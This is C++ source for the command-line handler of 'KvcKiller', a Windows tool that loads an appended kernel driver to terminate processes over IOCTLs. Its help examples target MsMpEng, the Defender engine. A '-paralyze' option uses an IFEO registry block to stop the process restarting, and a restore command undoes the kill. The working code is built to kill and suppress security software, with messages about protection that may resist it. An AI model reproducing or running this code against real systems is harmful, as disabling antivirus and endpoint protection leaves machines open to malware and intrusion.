// CLIHandler.cpp
// © WESMAR Marek Wesołowski
//
// Headless command-line interface for KvcKiller.
// WinMain delegates here when argc > 1; this module never touches any GUI handles.
//
// Supported commands:
//   -help                    Print usage and exit.
//   -list                    Enumerate config targets and show running status.
//   -kill <name> [-paralyze] Kill a process; optionally rename .exe → .exe.bak.
//   -restore <name>          Reverse a prior kill / paralyze via SCM or ShellExecute.

#include "CLIHandler.h"
#include "Utils.h"
#include "DriverController.h"
#include "ProcessKiller.h"
#include "ConfigReader.h"
#include "ProcessOperations.h"
#include "ProcessOperations.h"
#include "Resource.h"

#include <algorithm>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// Console setup
// ---------------------------------------------------------------------------

// Attaches to the parent process console (the cmd.exe or PowerShell window that
// launched us) and re-opens stdin/stdout/stderr against it.
//
// AttachConsole is used instead of AllocConsole because we are a GUI subsystem
// binary (/SUBSYSTEM:WINDOWS).  AttachConsole lets us print into the *existing*
// console session rather than popping a new window — but it does nothing if the
// parent has no console (e.g., double-clicked from Explorer).
//
// _setmode(_O_U16TEXT) must be set AFTER freopen_s so the CRT knows the
// underlying handle is Unicode-capable; without it, wprintf to a Unicode console
// silently drops non-ASCII characters.
void SetupConsole() {
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) return;

    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    freopen_s(&fp, "CONIN$",  "r", stdin);
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stderr), _O_U16TEXT);
    _setmode(_fileno(stdin),  _O_U16TEXT);
}

// ---------------------------------------------------------------------------
// Synthetic Enter — fixes the "missing prompt redraw" issue with AttachConsole
// ---------------------------------------------------------------------------

// When a GUI-subsystem process attaches to a console and then exits, the parent
// shell does not redraw its prompt because it never got a signal that our
// process finished (it wasn't waiting for us in the first place).  Injecting a
// synthetic Enter key-press into the console input queue forces cmd.exe /
// PowerShell to re-draw the prompt line after we return.
//
// Both a key-down and key-up event are injected; some shells ignore one or the other.
void SendEnterToConsole() {
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE) return;

    FlushConsoleInputBuffer(hStdin);

    INPUT_RECORD ir[2] = {};

    // Key-down event for VK_RETURN.
    ir[0].EventType                        = KEY_EVENT;
    ir[0].Event.KeyEvent.bKeyDown          = TRUE;
    ir[0].Event.KeyEvent.wRepeatCount      = 1;
    ir[0].Event.KeyEvent.wVirtualKeyCode   = VK_RETURN;
    ir[0].Event.KeyEvent.wVirtualScanCode  =
        static_cast<WORD>(MapVirtualKeyW(VK_RETURN, MAPVK_VK_TO_VSC));
    ir[0].Event.KeyEvent.uChar.UnicodeChar = L'\r';
    ir[0].Event.KeyEvent.dwControlKeyState = 0;

    // Matching key-up event (copy of key-down with bKeyDown flipped).
    ir[1]                         = ir[0];
    ir[1].Event.KeyEvent.bKeyDown = FALSE;

    DWORD written = 0;
    WriteConsoleInputW(hStdin, ir, 2, &written);
}

// ---------------------------------------------------------------------------
// Help
// ---------------------------------------------------------------------------

void PrintHelp() {
    wprintf(L"\nKvcKiller - %ls\n", LoadStr(IDS_APP_SUBTITLE).c_str());
    wprintf(L"%ls\n\n",             LoadStr(IDS_AUTHOR_LINE).c_str());
    wprintf(L"Usage:\n");
    wprintf(L"  KvcKiller.exe -help                      Show this help message (.exe - optional)\n");
    wprintf(L"  KvcKiller.exe -list                      List target processes and their status\n");
    wprintf(L"  KvcKiller.exe -kill <n> [-paralyze]   Kill a process; -paralyze blocks execution\n");
    wprintf(L"  KvcKiller.exe -restore <n>            Restore a killed service (auto-reverses paralyze)\n\n");
    wprintf(L"Examples:\n");
    wprintf(L"  KvcKiller.exe -list\n");
    wprintf(L"  KvcKiller.exe -kill MsMpEng\n");
    wprintf(L"  KvcKiller -kill -paralyze MsMpEng.exe\n");
    wprintf(L"  KvcKiller.exe -restore MsMpEng\n");
}

// ---------------------------------------------------------------------------
// Internal: driver initialisation
// ---------------------------------------------------------------------------
// The CLI doesn't use ProcessOperations::InitializeDriver because that module
// includes GUI headers (hListView etc.) which are undefined in headless mode.
// This thin wrapper calls DriverController directly and mirrors the same logic.

static bool InitDriverForCli() {
    if (DriverController::IsDriverLoaded()) return true;

    const std::wstring driverPath = DriverController::GetDriverPath();
    if (!DriverController::RegisterDriver(driverPath)) return false;
    if (!DriverController::StartDriver())              return false;
    return true;
}

// ---------------------------------------------------------------------------
// CLI dispatcher
// ---------------------------------------------------------------------------

// Entry point called from WinMain when argc > 1.
// Returns an exit code suitable for use as the process exit code.
//
// finishCli is a local lambda that handles all cleanup paths:
//   - flushes stdout/stderr so buffered output is not lost
//   - optionally closes the driver handle (frees the IOCTL channel)
//   - injects the synthetic Enter so the parent shell redraws its prompt
//   - releases the console handle
int RunCLI(int argc, LPWSTR* argv) {
    SetupConsole();

    // Single cleanup point for all return paths.
    // closeDriver=true triggers driver handle release + registry cleanup.
    auto finishCli = [](int code, bool closeDriver = false) -> int {
        if (closeDriver) DriverController::CloseDriverHandle();
        fflush(stdout);
        fflush(stderr);
        SendEnterToConsole();
        FreeConsole();
        return code;
    };

    const std::wstring cmd = argv[1];

    // -help / --help / /?  — does not require admin or driver
    if (cmd == L"-help" || cmd == L"--help" || cmd == L"/?") {
        PrintHelp();
        return finishCli(0);
    }

    // All other commands require elevation.
    if (!IsRunningAsAdmin()) {
        wprintf(L"[!] ERROR: Please run as Administrator!\n");
        return finishCli(1);
    }

    // Load the kernel driver before any IOCTL operations.
    wprintf(L"\n[*] Initializing driver...\n");
    if (!InitDriverForCli()) {
        wprintf(L"[!] ERROR: Driver initialization failed.\n");
        wprintf(L"[*] Ensure you are running as Administrator and the payload is appended to the executable.\n");
        return finishCli(1);
    }

    HANDLE hDriver = DriverController::GetDriverHandle();
    if (hDriver == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] ERROR: Driver handle is invalid!\n");
        return finishCli(1, true);
    }

    // -list: enumerate config targets and show running/not-running status
    if (cmd == L"-list") {
        wprintf(L"[*] Scanning for targets...\n\n");

        auto processNames = ConfigReader::ReadProcessList();
        std::vector<std::wstring> exeNames;
        for (const auto& name : processNames) exeNames.push_back(name + L".exe");

        auto running = ProcessKiller::FindProcesses(exeNames);

        wprintf(L"%-30s | %-10s | %-10s\n", L"Process Name", L"PID", L"Status");
        wprintf(L"-------------------------------+------------+-----------\n");

        for (const auto& name : processNames) {
            const std::wstring exeName = name + L".exe";
            // Case-insensitive search in the running list.
            const auto it = std::find_if(running.begin(), running.end(),
                [&exeName](const ProcessInfo& p) {
                    return _wcsicmp(p.name.c_str(), exeName.c_str()) == 0;
                });

            if (it != running.end())
                wprintf(L"%-30s | %-10lu | RUNNING\n",     exeName.c_str(), it->pid);
            else
                wprintf(L"%-30s | %-10s | NOT RUNNING\n",  exeName.c_str(), L"-");
        }

        return finishCli(0, true);
    }

    // -kill <name> [-paralyze] or -kill -paralyze <name>
    if (cmd == L"-kill") {
        if (argc < 3) {
            wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -kill <n> [-paralyze]\n");
            return finishCli(1, true);
        }

        bool doParalyze = false;
        std::wstring targetStr;

        if (_wcsicmp(argv[2], L"-paralyze") == 0) {
            doParalyze = true;
            if (argc < 4) {
                wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -kill -paralyze <n>\n");
                return finishCli(1, true);
            }
            targetStr = argv[3];
        } else {
            targetStr = argv[2];
            for (int i = 3; i < argc; ++i) {
                if (_wcsicmp(argv[i], L"-paralyze") == 0) {
                    doParalyze = true;
                    break;
                }
            }
        }

        const std::wstring target = EnsureExeName(targetStr);

        wprintf(L"[*] Searching for %ls...\n", target.c_str());

        auto running = ProcessKiller::FindProcesses({ target });
        if (running.empty()) {
            wprintf(L"[-] Process %ls is ALREADY DEAD (NOT RUNNING).\n", target.c_str());
        } else {
            // --- Paralyze Phase (BEFORE Kill) ---
            if (doParalyze) {
                std::vector<std::wstring> toParalyze = { StripExeExtension(target) };
                if (ParalyzeProcessesBatch(toParalyze) > 0) {
                    wprintf(L"[+] Paralyzed %ls via IFEO block\n", target.c_str());
                } else {
                    wprintf(L"[!] Paralyze failed for %ls via IFEO block\n", target.c_str());
                }
            }

            for (const auto& proc : running) {
                HANDLE hProc = OpenProcess(SYNCHRONIZE, FALSE, proc.pid);
                if (ProcessKiller::KillProcess(hDriver, proc.pid)) {
                    if (hProc) {
                        // Wait up to 2 seconds for the process to signal termination
                        WaitForSingleObject(hProc, 2000);
                    }
                    if (!ProcessKiller::IsProcessRunning(proc.pid)) {
                        const std::wstring path = ConfigReader::ReadProcessPath(proc.name);
                        ConfigReader::RecordHistory(L"KILL", proc.name, path);
                        wprintf(L"[+] Successfully killed %ls (PID: %lu)\n",
                                proc.name.c_str(), proc.pid);
                    } else {
                        // IOCTL was accepted but the process is still alive —
                        // likely protected by a watchdog or anti-tamper driver.
                        wprintf(L"[!] IOCTL sent, but %ls (PID: %lu) is still running!"
                                L" Protection might be active.\n", proc.name.c_str(), proc.pid);
                    }
                } else {
                    wprintf(L"[!] Failed to send IOCTL to kill %ls (PID: %lu)\n",
                            proc.name.c_str(), proc.pid);
                }
                if (hProc) {
                    CloseHandle(hProc);
                }
            }
        }

        return finishCli(0, true);
    }

    // -restore <name>
    if (cmd == L"-restore") {
        if (argc < 3) {
            wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -restore <n>\n");
            return finishCli(1, true);
        }

        const std::wstring target = EnsureExeName(argv[2]);
        wprintf(L"[*] Attempting to restore service associated with %ls...\n", target.c_str());

        // --- Unparalyze Phase (BEFORE Restore) ---
        // Always unparalyze first
        std::wstring bareName = StripExeExtension(target);
        if (IsProcessParalyzed(bareName)) {
            std::vector<std::wstring> toUnparalyze = { bareName };
            if (UnparalyzeProcessesBatch(toUnparalyze) > 0) {
                wprintf(L"[*] Unparalyzed %ls via IFEO block\n", target.c_str());
            } else {
                wprintf(L"[!] Failed to unparalyze %ls — restore may fail\n", target.c_str());
            }
        }

        const std::wstring path = ConfigReader::ReadProcessPath(target);

        // RestoreProcess returns: 0 = failed, 1 = started, 2 = already running.
        const int res = ProcessKiller::RestoreProcess(target);
        if (res == 2) {
            wprintf(L"[*] Process %ls is ALREADY RUNNING.\n", target.c_str());
        } else if (res == 1) {
            ConfigReader::RecordHistory(L"RESTORE", target, path);
            wprintf(L"[+] Successfully sent start command to the associated service or executable!\n");
        } else {
            wprintf(L"[-] Could not restore."
                    L" Service might not exist or tampered protection is blocking it.\n");
        }

        return finishCli(0, true);
    }

    // Unknown command — print help so the user knows what went wrong.
    wprintf(L"[!] Unknown command: %ls\n", cmd.c_str());
    PrintHelp();
    return finishCli(1, true);
}
